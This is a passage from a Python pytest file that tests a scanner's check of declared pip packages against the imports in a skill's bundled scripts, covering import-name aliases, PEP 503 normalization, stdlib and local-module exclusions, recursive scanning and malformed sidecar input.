    findings = scanner.find_packages_drift(None, skill_dir)
    assert _severities(findings) == ["error"]
    assert "'yaml'" in findings[0].message


def test_pillow_alias_declared_pillow_import_pil_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("pillow"),
        scripts={"resize.py": "import PIL\n"},
    )
    assert scanner.find_packages_drift({"pip": ["pillow"]}, skill_dir) == []


def test_opencv_alias_declared_opencv_python_import_cv2_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("opencv-python"),
        scripts={"vision.py": "import cv2\n"},
    )
    assert scanner.find_packages_drift({"pip": ["opencv-python"]}, skill_dir) == []


def test_beautifulsoup_alias_declared_beautifulsoup4_import_bs4_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("beautifulsoup4"),
        scripts={"scrape.py": "import bs4\n"},
    )
    assert scanner.find_packages_drift({"pip": ["beautifulsoup4"]}, skill_dir) == []


def test_sklearn_alias_declared_scikit_learn_import_sklearn_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("scikit-learn"),
        scripts={"ml.py": "import sklearn\n"},
    )
    assert scanner.find_packages_drift({"pip": ["scikit-learn"]}, skill_dir) == []


def test_dateutil_alias_declared_python_dateutil_import_dateutil_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("python-dateutil"),
        scripts={"dates.py": "import dateutil\n"},
    )
    assert scanner.find_packages_drift({"pip": ["python-dateutil"]}, skill_dir) == []


def test_attrs_alias_import_attr_spelling_resolves(tmp_path: pathlib.Path) -> None:
    """attrs ships "attr" as one of its two real top-level import names
    for the same distribution."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("attrs"),
        scripts={"model.py": "import attr\n"},
    )
    assert scanner.find_packages_drift({"pip": ["attrs"]}, skill_dir) == []


def test_attrs_alias_import_attrs_spelling_resolves(tmp_path: pathlib.Path) -> None:
    """attrs ships "attrs" as its OTHER real top-level import name for
    the same distribution -- both keys in _IMPORT_NAME_TO_DISTRIBUTION
    map to the same declared "attrs" value."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("attrs"),
        scripts={"model.py": "import attrs\n"},
    )
    assert scanner.find_packages_drift({"pip": ["attrs"]}, skill_dir) == []


def test_pyjwt_alias_declared_pyjwt_import_jwt_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("pyjwt"),
        scripts={"auth.py": "import jwt\n"},
    )
    assert scanner.find_packages_drift({"pip": ["pyjwt"]}, skill_dir) == []


def test_unlisted_alias_produces_documented_false_positive(tmp_path: pathlib.Path) -> None:
    """Disclosed residual limitation (see _IMPORT_NAME_TO_DISTRIBUTION's
    own comment), proven concretely rather than only asserted:
    python-dotenv/dotenv is a real, well-known import-name/distribution-
    name mismatch pair deliberately left OFF this table. A script
    correctly declaring the real distribution name still produces a
    false "under-declared" positive for the import name, because this
    function has no way to know "dotenv" and "python-dotenv" name the
    same package without the table saying so -- AND, symmetrically, a
    spurious "over-declared" warning for the declared name, since from
    this checker's own limited perspective the two strings look entirely
    unrelated in BOTH directions at once. If a future change adds this
    pair to the table, this test's own assertions must be updated
    deliberately, not silently."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("python-dotenv"),
        scripts={"config.py": "import dotenv\n"},
    )
    findings = scanner.find_packages_drift({"pip": ["python-dotenv"]}, skill_dir)
    errors = [f for f in findings if f.severity == "error"]
    warnings = [f for f in findings if f.severity == "warning"]
    assert len(errors) == 1
    assert "'dotenv'" in errors[0].message
    assert any("'python-dotenv'" in f.message for f in warnings)


def test_alias_table_direction_declared_import_spelling_does_not_cover_the_real_distribution_name(
    tmp_path: pathlib.Path,
) -> None:
    """Adversarial probe of the alias table's own DIRECTION: declaring
    the IMPORT name itself ("yaml", not "pyyaml") satisfies a script that
    actually imports "yaml" via the DIRECT match alone (no aliasing
    needed) -- but must NOT be treated as if "yaml" were somehow the
    distribution name backing a DIFFERENT import literally spelled
    "pyyaml". Synthetic ("import pyyaml" is not real importable code --
    the real module is always "yaml"), but probes the predicate's own
    directionality, not real-world plausibility: proves
    _IMPORT_NAME_TO_DISTRIBUTION is consulted as import-name -> dist-name
    only, never the reverse."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("yaml"),
        scripts={"a.py": "import yaml\n", "b.py": "import pyyaml\n"},
    )
    findings = scanner.find_packages_drift({"pip": ["yaml"]}, skill_dir)
    # "yaml" (the real import) is satisfied by the direct match against
    # declared "yaml" -- both for under-declared AND over-declared.
    # "pyyaml" (the synthetic import) is NOT satisfied: it isn't declared
    # directly, and _IMPORT_NAME_TO_DISTRIBUTION has no "pyyaml" KEY
    # (only "yaml" is a key, mapping TO "pyyaml", never the reverse), so
    # no alias resolves it either.
    assert _severities(findings) == ["error"]
    assert "'pyyaml'" in findings[0].message


# ---- find_packages_drift: full PEP 503 normalization, not lower-casing
# alone (issue #1121, Finding 2 -- an independent adversarial review
# found live that a bare .lower() left '-'/'_'/'.' separators untouched,
# producing a false under-declared error and a spurious over-declared
# warning simultaneously for the same real package) ----


def test_scikit_learn_underscore_spelling_satisfies_sklearn_alias_pep503(tmp_path: pathlib.Path) -> None:
    """ "scikit_learn" (underscore) is a valid alternate spelling of the
    real distribution "scikit-learn" -- pip/PyPI treat '-'/'_'/'.' as
    equivalent separators per PEP 503. Before the fix, bare .lower() left
    the underscore untouched, so "scikit_learn" != "scikit-learn" as
    strings -- producing BOTH a false under-declared error for "sklearn"
    AND a spurious over-declared warning for "scikit_learn" at once."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("scikit_learn"),
        scripts={"ml.py": "import sklearn\n"},
    )
    findings = scanner.find_packages_drift({"pip": ["scikit_learn"]}, skill_dir)
    assert not any(f.kind == "deterministic" for f in findings)


def test_python_dot_dateutil_spelling_satisfies_dateutil_alias_pep503(tmp_path: pathlib.Path) -> None:
    """A second separator-normalization case (dots, not just underscores):
    "python.dateutil" normalizes to the same "python-dateutil" as the
    real distribution name under PEP 503 (re.sub(r"[-_.]+", "-",
    name).lower())."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("python.dateutil"),
        scripts={"dates.py": "import dateutil\n"},
    )
    findings = scanner.find_packages_drift({"pip": ["python.dateutil"]}, skill_dir)
    assert not any(f.kind == "deterministic" for f in findings)


# ---- find_packages_drift: over-declared (deterministic, single evidence source) ----


def test_over_declared_no_matching_import_is_warning(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("pyyaml"),
        scripts={"helper.py": "import pathlib\n"},
    )
    findings = scanner.find_packages_drift({"pip": ["pyyaml"]}, skill_dir)
    assert _severities(findings) == ["warning"]
    assert findings[0].kind == "deterministic"
    assert "packages-pip-over-declared" in findings[0].message
    assert "'pyyaml'" in findings[0].message


def test_declaring_a_stdlib_name_as_a_pip_package_is_over_declared(tmp_path: pathlib.Path) -> None:
    """A nonsensical-but-possible declaration (a stdlib module name under
    packages.pip, which never needs a PyPI declaration): the stdlib name
    is filtered out of non_stdlib_imports entirely, so it can never
    satisfy the over-declared check via a real import -- an emergent,
    not specially-coded, consequence of this function's own design."""
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import os\n"})
    findings = scanner.find_packages_drift({"pip": ["os"]}, skill_dir)
    assert any(f.severity == "warning" and "'os'" in f.message for f in findings)


def test_unparseable_script_suppresses_over_declared_warning(tmp_path: pathlib.Path) -> None:
    """Mirrors find_network_drift's own unrestricted-mode suppression:
    an unparsed script's real imports are genuinely unknown, so an
    over-declared claim cannot be proven true while any bundled Python
    script could not be parsed at all."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("pyyaml"),
        scripts={"broken.py": "def f(:\n    pass\n"},
    )
    findings = scanner.find_packages_drift({"pip": ["pyyaml"]}, skill_dir)
    assert findings == []


def test_unparseable_script_does_not_suppress_under_declared_for_parseable_scripts(tmp_path: pathlib.Path) -> None:
    """Suppression is scoped to over-declared only -- a real, undeclared
    import in a DIFFERENT, successfully-parsed script must still be
    flagged even while a sibling script fails to parse."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"broken.py": "def f(:\n    pass\n", "fetch.py": "import requests\n"},
    )
    findings = scanner.find_packages_drift(None, skill_dir)
    assert any(f.severity == "error" and "'requests'" in f.message for f in findings)


# ---- find_packages_drift: non-stdlib detection precision ----


def test_non_stdlib_module_sharing_stdlib_prefix_is_still_flagged(tmp_path: pathlib.Path) -> None:
    """osgeo (GDAL's real Python bindings) is NOT itself in
    sys.stdlib_module_names, even though it shares a leading substring
    with the real stdlib module "os" -- a prefix/substring-based stdlib
    check would incorrectly exempt it, letting a genuinely undeclared
    package slip through undetected. Exact set membership must not."""
    assert "osgeo" not in sys.stdlib_module_names
    skill_dir = _make_skill(tmp_path, scripts={"gis.py": "import osgeo\n"})
    findings = scanner.find_packages_drift(None, skill_dir)
    assert any("'osgeo'" in f.message for f in findings)


def test_stdlib_easter_egg_modules_are_not_flagged(tmp_path: pathlib.Path) -> None:
    """ "this" and "antigravity" are real, if obscure, stdlib modules --
    proves exact sys.stdlib_module_names membership recognizes them too,
    not just the common cases (os/sys/json)."""
    assert {"this", "antigravity"} <= set(sys.stdlib_module_names)
    skill_dir = _make_skill(tmp_path, scripts={"easter_egg.py": "import this\nimport antigravity\n"})
    assert scanner.find_packages_drift(None, skill_dir) == []


def test_import_nested_inside_function_is_still_detected(tmp_path: pathlib.Path) -> None:
    """Unlike .github/scripts/gitapex_gate_stdlib_only_claim_drift.py's
    own tree.body-only _imported_root_modules (appropriate there for a
    single diff-added line), this function walks the FULL tree -- a real
    import inside a function body must still be found."""
    skill_dir = _make_skill(
        tmp_path, scripts={"helper.py": "def fetch():\n    import requests\n    return requests.get\n"}
    )
    findings = scanner.find_packages_drift(None, skill_dir)
    assert any("'requests'" in f.message for f in findings)


def test_import_inside_try_except_optional_dependency_pattern_is_detected(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        scripts={"helper.py": "try:\n    import yaml\nexcept ImportError:\n    yaml = None\n"},
    )
    findings = scanner.find_packages_drift(None, skill_dir)
    assert any("'yaml'" in f.message for f in findings)


def test_relative_import_is_not_treated_as_an_external_package(tmp_path: pathlib.Path) -> None:
    """ "from . import helper" names no real external package at all
    (node.level > 0) -- must not be misattributed as a non-stdlib import
    requiring a packages.pip declaration."""
    skill_dir = _make_skill(tmp_path, scripts={"main.py": "from . import helper\n"})
    assert scanner.find_packages_drift(None, skill_dir) == []


def test_import_os_path_submodule_form_is_recognized_as_stdlib(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import os.path\n"})
    assert scanner.find_packages_drift(None, skill_dir) == []


# ---- find_packages_drift: non-installable non-stdlib modules (issue
# #1121, Finding 4 -- an independent adversarial review found live that
# _typeshed/__main__ were flagged as "under-declared" with no way to ever
# satisfy the check, since neither has a real PyPI distribution) ----


def test_type_checking_only_typeshed_import_is_not_flagged(tmp_path: pathlib.Path) -> None:
    """_typeshed is typeshed's own stub-only, type-checker-internal
    module (see
    https://github.com/python/typeshed/blob/main/stdlib/_typeshed/README.md)
    -- it ships no runtime code and has no PyPI distribution at all, so
    flagging it as "under-declared" would be an unfixable false positive:
    there is no real package to ever declare."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "helper.py": "from typing import TYPE_CHECKING\nif TYPE_CHECKING:\n    from _typeshed import StrPath\n"
        },
    )
    findings = scanner.find_packages_drift(None, skill_dir)
    assert not any("_typeshed" in f.message for f in findings)


def test_main_module_import_is_not_flagged(tmp_path: pathlib.Path) -> None:
    """__main__ is a real, always-importable module every Python process
    has for its own entry-point namespace -- not in
    sys.stdlib_module_names, but also not a PyPI-installable package, so
    it can never be satisfied by any real packages.pip declaration."""
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import __main__\n"})
    findings = scanner.find_packages_drift(None, skill_dir)
    assert not any("__main__" in f.message for f in findings)


def test_type_checking_guarded_real_package_import_is_still_flagged(tmp_path: pathlib.Path) -> None:
    """The _typeshed/__main__ exclusion is narrowly scoped to those two
    confirmed non-installable names -- a TYPE_CHECKING-guarded import of a
    REAL third-party package must still require a declaration (by design:
    conditional gating does not suppress detection, see
    _tree_imported_root_modules's own docstring)."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"helper.py": "from typing import TYPE_CHECKING\nif TYPE_CHECKING:\n    import requests\n"},
    )
    findings = scanner.find_packages_drift(None, skill_dir)
    assert any(f.severity == "error" and "'requests'" in f.message for f in findings)


# ---- find_packages_drift: local sibling-module imports (found live against
# this repository's own skills/executing-a-branch-plan during the required
# real-repository self-check -- see _is_local_sibling_module's own docstring) ----


def test_local_sibling_module_from_import_is_not_flagged(tmp_path: pathlib.Path) -> None:
    """The exact real shape found live: "from _helper import x" where
    _helper.py is a real sibling file in the SAME scripts/ directory
    (this repository's own skills/executing-a-branch-plan/scripts/
    gitapex_check_canonical_governance_paths.py imports
    _gitapex_path_normalize.py this same way) -- names no real external
    PyPI dependency at all, whatever its own root name looks like."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "_helper.py": "def normalize(x: str) -> str:\n    return x\n",
            "main.py": "from _helper import normalize\n",
        },
    )
    assert scanner.find_packages_drift(None, skill_dir) == []


def test_local_sibling_module_bare_import_is_not_flagged(tmp_path: pathlib.Path) -> None:
    """The same exclusion applies to a bare "import helper" (not just
    "from helper import x")."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "helper.py": "def f() -> None:\n    pass\n",
            "main.py": "import helper\n",
        },
    )
    assert scanner.find_packages_drift(None, skill_dir) == []


def test_local_sibling_subpackage_import_is_not_flagged(tmp_path: pathlib.Path) -> None:
    """A proper subpackage (scripts/helperpkg/__init__.py), not just a
    single-file sibling module, is also recognized."""
    skill_dir = _make_skill(tmp_path, scripts={"main.py": "import helperpkg\n"})
    subpkg_dir = skill_dir / "scripts" / "helperpkg"
    subpkg_dir.mkdir()
    (subpkg_dir / "__init__.py").write_text("", encoding="utf-8")
    assert scanner.find_packages_drift(None, skill_dir) == []


def test_import_with_no_matching_sibling_file_is_still_flagged(tmp_path: pathlib.Path) -> None:
    """The exclusion is narrowly scoped to a REAL sibling file/subpackage
    that actually exists -- it must not become a blanket exemption for
    every underscore-prefixed or short import name. A genuinely
    undeclared external package with no matching sibling file present
    must still be flagged."""
    skill_dir = _make_skill(tmp_path, scripts={"main.py": "import _totally_unrelated_thing\n"})
    findings = scanner.find_packages_drift(None, skill_dir)
    assert _severities(findings) == ["error"]
    assert "'_totally_unrelated_thing'" in findings[0].message


def test_real_repository_executing_a_branch_plan_sibling_import_is_clean(tmp_path: pathlib.Path) -> None:
    """Direct regression pin for the live false positive this exclusion
    was added to fix, run against the real repository tree itself (not a
    synthetic fixture) -- proves the fix against the exact skill and
    import name that originally produced it."""
    real_skill_dir = pathlib.Path("skills/executing-a-branch-plan")
    if not real_skill_dir.is_dir():
        pytest.skip("skills/executing-a-branch-plan not present in this checkout")
    findings = scanner.find_packages_drift(None, real_skill_dir)
    assert not any("_gitapex_path_normalize" in f.message for f in findings)


def test_is_local_sibling_module_direct_unit_no_scripts_dir(tmp_path: pathlib.Path) -> None:
    """Direct unit test of the helper itself: a skill with no scripts/
    directory at all must not crash and must report False, not True."""
    skill_dir = _make_skill(tmp_path)
    assert scanner._is_local_sibling_module(skill_dir, "anything") is False


# ---- find_packages_drift: PEP 420 namespace-package siblings (issue
# #1121, Finding 3 -- a false under-declared error an independent
# adversarial review found live, on a factually wrong "guessing, not
# observing" rationale for why namespace packages were excluded) ----


def test_namespace_package_sibling_without_init_py_is_recognized(tmp_path: pathlib.Path) -> None:
    """PEP 420 (Python 3.3+): a directory with NO __init__.py at all is
    still a real, importable package via Python's own standard import
    machinery -- verified live, `python3 -c "import nspkg.mod"` succeeds
    from a directory containing nspkg/mod.py with no nspkg/__init__.py,
    resolving through CPython's own _NamespacePath. Before the fix, "import
    nspkg" here produced a false "under-declared" error, because a
    namespace-package-shaped sibling directory looked identical to an
    external package to the prior version of _is_local_sibling_module."""
    skill_dir = _make_skill(tmp_path, scripts={"main.py": "import nspkg\n"})
    subpkg_dir = skill_dir / "scripts" / "nspkg"
    subpkg_dir.mkdir()
    (subpkg_dir / "mod.py").write_text("X = 1\n", encoding="utf-8")
    assert scanner.find_packages_drift(None, skill_dir) == []


def test_is_local_sibling_module_recognizes_namespace_package_directly(tmp_path: pathlib.Path) -> None:
    """Direct unit test of the helper: True for a namespace-package-shaped
    directory (no __init__.py, but a real .py file inside it)."""
    skill_dir = _make_skill(tmp_path)
    subpkg_dir = skill_dir / "scripts" / "nspkg"
    subpkg_dir.mkdir(parents=True)
    (subpkg_dir / "mod.py").write_text("X = 1\n", encoding="utf-8")
    assert scanner._is_local_sibling_module(skill_dir, "nspkg") is True


def test_is_local_sibling_module_empty_subdirectory_is_still_not_recognized(tmp_path: pathlib.Path) -> None:
    """The namespace-package fix is narrowly scoped to a subdirectory
    containing at least one real .py file -- an EMPTY same-named
    subdirectory (nothing that could actually satisfy the import at
    runtime, namespace package or not) must still read as False, matching
    this function's own "guessing vs. observing" principle for the case it
    genuinely applies to."""
    skill_dir = _make_skill(tmp_path)
    empty_dir = skill_dir / "scripts" / "emptypkg"
    empty_dir.mkdir(parents=True)
    assert scanner._is_local_sibling_module(skill_dir, "emptypkg") is False


# ---- find_packages_drift: recursive scanning of a local sibling
# subpackage's own content (issue #1121, Finding 1 -- a HIGH-severity
# total fail-open an independent adversarial review found live) ----


def test_sibling_subpackage_content_is_recursively_scanned_for_its_own_imports(tmp_path: pathlib.Path) -> None:
    """The exact fail-open reproduced live: a top-level script does a bare
    "import helperpkg" (correctly excluded from under-declared via
    _is_local_sibling_module), but helperpkg's own __init__.py does
    "import requests" -- a REAL external dependency that must still
    surface as under-declared. Before the fix this returned []:
    helperpkg's own file was never even a candidate for AST parsing
    (scripts/*.py was a non-recursive glob), so its "requests" import was
    silently invisible to every check built on _bundled_script_trees, not
    merely excluded -- defeating the entire check for any script organized
    as a local subpackage."""
    skill_dir = _make_skill(tmp_path, scripts={"main.py": "import helperpkg\n"})
    subpkg_dir = skill_dir / "scripts" / "helperpkg"
    subpkg_dir.mkdir()
    (subpkg_dir / "__init__.py").write_text("import requests\n", encoding="utf-8")
    findings = scanner.find_packages_drift({"pip": []}, skill_dir)
    assert any(f.severity == "error" and "'requests'" in f.message for f in findings)
    # helperpkg itself must still be correctly excluded (it IS a real
    # local sibling subpackage, not an external dependency) -- only its
    # OWN content's own further import ("requests") is the real gap.
    assert not any("'helperpkg'" in f.message for f in findings)


def test_bundled_script_trees_recurses_into_subpackage_directories(tmp_path: pathlib.Path) -> None:
    """Direct unit test of the helper itself: a .py file nested inside a
    scripts/ subdirectory (not directly under scripts/) is discovered and
    parsed, not silently skipped."""
    skill_dir = _make_skill(tmp_path, scripts={"main.py": "import helperpkg\n"})
    subpkg_dir = skill_dir / "scripts" / "helperpkg"
    subpkg_dir.mkdir()
    (subpkg_dir / "__init__.py").write_text("import requests\n", encoding="utf-8")
    trees, unparseable = scanner._bundled_script_trees(skill_dir)
    assert unparseable == []
    all_imports: set[str] = set()
    for tree in trees:
        all_imports |= scanner._tree_imported_root_modules(tree)
    assert {"helperpkg", "requests"} <= all_imports


def test_bundled_script_trees_test_file_exclusion_applies_recursively(tmp_path: pathlib.Path) -> None:
    """The "test_*" pytest-discovery exclusion (see this function's own
    docstring) must still apply to a file nested inside a subpackage, not
    just a top-level scripts/*.py file -- a test file's own imports are
    not the skill's real shipped capability regardless of depth."""
    skill_dir = _make_skill(tmp_path, scripts={"main.py": "import helperpkg\n"})
    subpkg_dir = skill_dir / "scripts" / "helperpkg"
    subpkg_dir.mkdir()
    (subpkg_dir / "__init__.py").write_text("", encoding="utf-8")
    (subpkg_dir / "test_helperpkg.py").write_text("import some_test_only_dependency\n", encoding="utf-8")
    findings = scanner.find_packages_drift({"pip": []}, skill_dir)
    assert not any("some_test_only_dependency" in f.message for f in findings)


def test_unparseable_file_inside_subpackage_is_reported_with_its_real_relative_path(tmp_path: pathlib.Path) -> None:
    """An unparseable/unreadable name is now recorded relative to
    scripts_dir (e.g. "helperpkg/broken.py"), not a bare basename -- a
    name collision across two different subdirectories is possible now
    that scanning is recursive, and the finding message
    (f"scripts/{name}") must still point at the real file, not a
    misleading top-level guess."""
    skill_dir = _make_skill(tmp_path, scripts={"main.py": "import helperpkg\n"})
    subpkg_dir = skill_dir / "scripts" / "helperpkg"
    subpkg_dir.mkdir()
    (subpkg_dir / "__init__.py").write_text("", encoding="utf-8")
    (subpkg_dir / "broken.py").write_text("def f(:\n    pass\n", encoding="utf-8")
    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
    assert any(f.severity == "error" and "scripts/helperpkg/broken.py" in f.message for f in findings)


# ---- find_packages_drift: case sensitivity ----


def test_declared_package_name_case_insensitive_direct_match(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("Requests"),
        scripts={"fetch.py": "import requests\n"},
    )
    assert scanner.find_packages_drift({"pip": ["Requests"]}, skill_dir) == []


def test_declared_package_name_case_insensitive_alias_match(tmp_path: pathlib.Path) -> None:
    """PyYAML is commonly written mixed-case in the real world (e.g.
    requirements.txt files); the declared-name side of the alias
    comparison must be case-insensitive (PEP 503), same as
    declared_domains' own hostname handling (RFC 4343)."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("PyYAML"),
        scripts={"fetch.py": "import yaml\n"},
    )
    assert scanner.find_packages_drift({"pip": ["PyYAML"]}, skill_dir) == []


def test_import_name_case_sensitivity_is_preserved_for_alias_lookup(tmp_path: pathlib.Path) -> None:
    """Unlike the declared-name side, the IMPORT name side of the alias
    lookup is exact-case, matching real Python import semantics (a
    module spelled "Yaml" is not the same real importable name as
    "yaml", whatever the sidecar declares). Deliberately KEPT exact-case
    even after issue #1121's own Finding 6 (a case-handling-inconsistency
    review comment): a live check confirmed the OTHER direction of fix
    (case-folding this alias lookup too) would silently un-flag this
    exact scenario, trading this real, already-tested correctness
    property for merely-consistent-but-wrong behavior -- see
    _pip_declared_for_import's own docstring."""
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import Yaml\n"})
    findings = scanner.find_packages_drift({"pip": ["pyyaml"]}, skill_dir)
    assert any(f.severity == "error" and "'Yaml'" in f.message for f in findings)


# ---- find_packages_drift: case-handling consistency + message
# readability (issue #1121, Finding 6) ----


def test_over_declared_message_preserves_original_declared_casing(tmp_path: pathlib.Path) -> None:
    """Readability fix: the over-declared finding message must use the
    ORIGINAL declared spelling ("PyYAML"), not the normalized/lower-cased
    form ("pyyaml") -- a sidecar author grepping their own file for the
    string in the finding message must be able to find it verbatim.
    Before the fix, a sidecar declaring "PyYAML" produced a warning
    naming 'pyyaml', which matches nothing in the real sidecar."""
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import pathlib\n"})
    findings = scanner.find_packages_drift({"pip": ["PyYAML"]}, skill_dir)
    deterministic = [f for f in findings if f.kind == "deterministic"]
    assert any("'PyYAML'" in f.message for f in deterministic)
    assert not any("'pyyaml'" in f.message for f in deterministic)


def test_direct_match_applies_full_pep503_normalization_to_the_import_side_too(tmp_path: pathlib.Path) -> None:
    """Case-handling-consistency fix: the direct-match branch (comparing
    import_name itself against a declared distribution name, with no
    alias table involved at all) now applies the SAME full PEP 503
    normalization to import_name that the declared side already gets --
    resolving the internal inconsistency an earlier version had (that
    branch alone lower-cased import_name, but did not collapse
    separators, and did so inconsistently with the alias branch). "my_pkg"
    (a real, legal import identifier with an underscore) matches a
    declared "my-pkg" (hyphen) directly, with no alias table entry needed
    for either spelling."""
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import my_pkg\n"})
    findings = scanner.find_packages_drift({"pip": ["my-pkg"]}, skill_dir)
    assert not any(f.kind == "deterministic" for f in findings)


# ---- find_packages_drift: malformed/adversarial input (fail-closed proofs) ----


def test_packages_param_not_a_dict_is_tolerated(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import requests\n"})
    findings = scanner.find_packages_drift("garbage-not-a-dict", skill_dir)
    assert _severities(findings) == ["error"]


def test_pip_key_a_bare_string_does_not_iterate_characters(tmp_path: pathlib.Path) -> None:
    """Classic Python footgun: a malformed sidecar declaring packages.pip
    as a bare STRING ("pyyaml") instead of a list (["pyyaml"]) must not
    be silently iterated CHARACTER BY CHARACTER ({'p','y','a','m','l'}).
    Treated as "nothing declared" (fails closed: a real import is still
    flagged), never as an accidental per-character allowlist."""
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import yaml\n"})
    findings = scanner.find_packages_drift({"pip": "pyyaml"}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "'yaml'" in findings[0].message


def test_pip_list_with_non_string_items_is_tolerated(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("pyyaml"),
        scripts={"fetch.py": "import yaml\n"},
    )
    findings = scanner.find_packages_drift({"pip": [123, None, "pyyaml", {"nested": True}]}, skill_dir)
    assert findings == []


def test_packages_with_only_non_pip_ecosystem_is_ignored(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import requests\n"})
    findings = scanner.find_packages_drift({"npm": ["left-pad"]}, skill_dir)
    assert _severities(findings) == ["error"]
    assert not any("left-pad" in f.message or "npm" in f.message for f in findings)


def test_multiple_ecosystems_only_pip_is_checked(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("requests"),
        scripts={"fetch.py": "import requests\n"},
    )
    findings = scanner.find_packages_drift({"pip": ["requests"], "npm": ["left-pad"], "cargo": ["serde"]}, skill_dir)
    assert findings == []


def test_missing_skill_md_compatibility_check_does_not_crash(tmp_path: pathlib.Path) -> None:
    skill_dir = tmp_path / "no-skill-md"
    skill_dir.mkdir()
    findings = scanner.find_packages_drift({"pip": ["pyyaml"]}, skill_dir)
    # No scripts dir either -> over-declared warning + compatibility
    # warning, no crash.
    assert _severities(findings) == ["warning", "warning"]


# ---- find_packages_drift: compatibility-mention heuristic ----


def test_compatibility_missing_package_mention_is_warning(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md='---\nname: example-skill\ndescription: x\ncompatibility: "Runs anywhere."\n---\n\n# Example\n',
        scripts={"fetch.py": "import yaml\n"},
    )
    findings = scanner.find_packages_drift({"pip": ["pyyaml"]}, skill_dir)
    assert len(findings) == 1
    assert findings[0].kind == "heuristic"
    assert findings[0].severity == "warning"
    assert "packages-pip-vs-compatibility" in findings[0].message
    assert "'pyyaml'" in findings[0].message


def test_compatibility_mentions_package_is_fully_clean(tmp_path: pathlib.Path) -> None:
    """Comprehensive positive case: script imports yaml (satisfies
    deterministic-under), sidecar declares pyyaml (satisfies
    deterministic-over via alias), compatibility mentions pyyaml
    (satisfies heuristic) -- all three checks pass at once, zero
    findings total."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md=_compat_skill_md("pyyaml"),
        scripts={"fetch.py": "import yaml\n"},
    )
    assert scanner.find_packages_drift({"pip": ["pyyaml"]}, skill_dir) == []


def test_compatibility_field_absent_entirely_is_warning(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example Skill\n\n## Steps\n\n1. Read the input.\n",
        scripts={"fetch.py": "import yaml\n"},
    )
    findings = scanner.find_packages_drift({"pip": ["pyyaml"]}, skill_dir)
    assert any(f.kind == "heuristic" for f in findings)


def test_compatibility_frontmatter_present_but_key_absent_is_warning(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="---\nname: example-skill\ndescription: x\n---\n\n# Example\n",
        scripts={"fetch.py": "import yaml\n"},
    )
    findings = scanner.find_packages_drift({"pip": ["pyyaml"]}, skill_dir)
    assert any(f.kind == "heuristic" for f in findings)


def test_compatibility_case_sensitive_mismatch_still_flags(tmp_path: pathlib.Path) -> None:
    """Disclosed residual limitation (issue #1121's own Acceptance
    Criteria Map: "a package mentioned with different casing/spacing in
    compatibility would still flag"), proven concretely rather than only
    asserted in the docstring."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md='---\nname: example-skill\ndescription: x\ncompatibility: "Requires PyYAML."\n---\n\n# Example\n',
        scripts={"fetch.py": "import yaml\n"},
    )
    findings = scanner.find_packages_drift({"pip": ["pyyaml"]}, skill_dir)
    assert any(f.kind == "heuristic" and "'pyyaml'" in f.message for f in findings)


def test_compatibility_multiple_packages_checked_independently(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md=(
            '---\nname: example-skill\ndescription: x\ncompatibility: "Requires pyyaml only."\n---\n\n# Example\n'
        ),
        scripts={"fetch.py": "import yaml\nimport requests\n"},
    )
    findings = scanner.find_packages_drift({"pip": ["pyyaml", "requests"]}, skill_dir)
    heuristic = [f for f in findings if f.kind == "heuristic"]
    assert len(heuristic) == 1
    assert "'requests'" in heuristic[0].message


def test_compatibility_check_does_not_depend_on_unparseable_scripts(tmp_path: pathlib.Path) -> None:
    """Unlike the over-declared warning, the compatibility-mention check
